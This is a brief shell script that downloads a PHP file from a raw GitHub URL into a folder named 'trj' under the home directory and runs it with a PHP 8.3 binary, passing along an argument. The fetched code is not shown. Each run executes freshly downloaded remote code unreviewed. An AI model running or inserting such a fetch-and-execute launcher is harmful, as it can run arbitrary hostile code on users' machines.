#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o fxwa2.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/fxwa2.php?t=$(date +%s)" && mv fxwa2.php.new fxwa2.php
/opt/alt/php83/usr/bin/php fxwa2.php "$1"
